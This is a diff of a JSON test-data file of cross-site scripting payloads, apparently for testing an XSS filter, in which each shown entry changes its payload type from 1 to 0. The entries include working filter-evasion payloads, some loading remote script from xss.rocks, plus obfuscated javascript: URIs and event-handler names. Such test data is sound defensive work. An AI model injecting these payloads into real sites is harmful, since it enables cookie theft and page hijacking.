@@ -1,2358 +1,2358 @@
 [
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"javascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=javascript:alert('XSS')>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=JaVaScRiPt:alert('XSS')>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=# onmouseover=\"alert('xxs')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC= onmouseover=\"alert('xxs')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG onmouseover=\"alert('xxs')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"jav\tascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\" &#14; javascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\<SCRIPT\\\\s",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\<SCRIPT/XSS\\\\s",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<BODY onload!#$%&()*~+-_.,:;",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\></SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT SRC=http://xss.rocks/xss.js?< B >",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT SRC=//xss.rocks/.j>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "/((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IFRAME",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<iframe src=http://xss.rocks/scriptlet.html <",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>var a=\"$ENV{QUERY\\_STRING}\";</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>var a=\"\\\\\\\\\";alert('XSS');//\";</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "\\\";alert('XSS');//",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "</script><script>alert('XSS');</script>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<TITLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG DYNSRC=\"javascript:alert('XSS')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG LOWSRC=\"javascript:alert('XSS')\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG SRC=\"livescript:[code]\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<svg/onload=alert('XSS')>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "Set.constructor`alert\\x28document.domain\\x29\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT...",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onload=",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onload =",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<BODY ONLOAD=alert('XSS')>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "FSCommand()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onAbort()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onActivate()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onAfterPrint()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onAfterUpdate()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforeActivate()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforeCopy()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "execCommand(\"Copy\")",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforeCut()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforeDeactivate()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforeEditFocus()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforePaste()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "execCommand(\"Paste\")",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforePrint()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "print()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "execCommand(\"Print\")",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforeUnload()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBeforeUpdate()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBegin()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBlur()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onBounce()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onCellChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onClick()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onContextMenu()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onControlSelect()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onCopy()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "execCommand(\"Copy\")",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onCut()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "execCommand(\"Cut\")",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDataAvailable()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDataSetChanged()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDataSetComplete()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDblClick()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDeactivate()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDrag()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDragEnd()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDragLeave()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDragEnter()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDragOver()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDragDrop()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDragStart()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onDrop()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onEnd()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onError()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onErrorUpdate()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onFilterChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onFinish()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onFocus()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onFocusIn()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onFocusOut()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onHashChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onHelp()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onInput()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onKeyDown()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onKeyPress()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onKeyUp()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onLayoutComplete()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onLoad()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onLoseCapture()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "releaseCapture()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMediaComplete()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMediaError()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMessage()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseDown()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseEnter()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseLeave()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseMove()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseOut()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseOver()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseUp()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMouseWheel()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMove()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMoveEnd()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onMoveStart()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onOffline()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onOnline()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onOutOfSync()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onPaste()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "execCommand(\"Paste\")",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onPause()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onPopState()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onProgress()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onPropertyChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onReadyStateChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onRedo()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onRepeat()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onReset()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onResize()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>self.resizeTo(500,400);</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onResizeEnd()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>self.resizeTo(500,400);</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onResizeStart()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<SCRIPT>self.resizeTo(500,400);</SCRIPT>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onResume()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onReverse()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onRowsEnter()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onRowExit()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onRowDelete()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onRowInserted()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onScroll()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "scrollBy()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onSeek()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onSelect()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "window.document.execCommand(\"SelectAll\");",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onSelectionChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "window.document.execCommand(\"SelectAll\");",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onSelectStart()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "window.document.execCommand(\"SelectAll\");",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onStart()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onStop()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onStorage()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onSyncRestored()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onSubmit()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onTimeError()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onTrackChange()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onUndo()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onUnload()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "onURLFlip()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "seekSegmentTime()",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<BGSOUND SRC=\"javascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<BR SIZE=\"&{alert('XSS')}\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<LINK>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "</STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "Link: <http://xss.rocks/xss.css>; REL=stylesheet",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "exp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>\n",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<XSS STYLE=\"xss:expression(alert('XSS'))\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "<XSS STYLE=\"behavior: url(xss.htc);\">",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
     "payload_text": "¼script¾alert(¢XSS¢)¼/script¾",
     "expected_fail": false,
     "valid": true
   },
   {
-    "payload_type": "1",
+    "payload_type": "0",
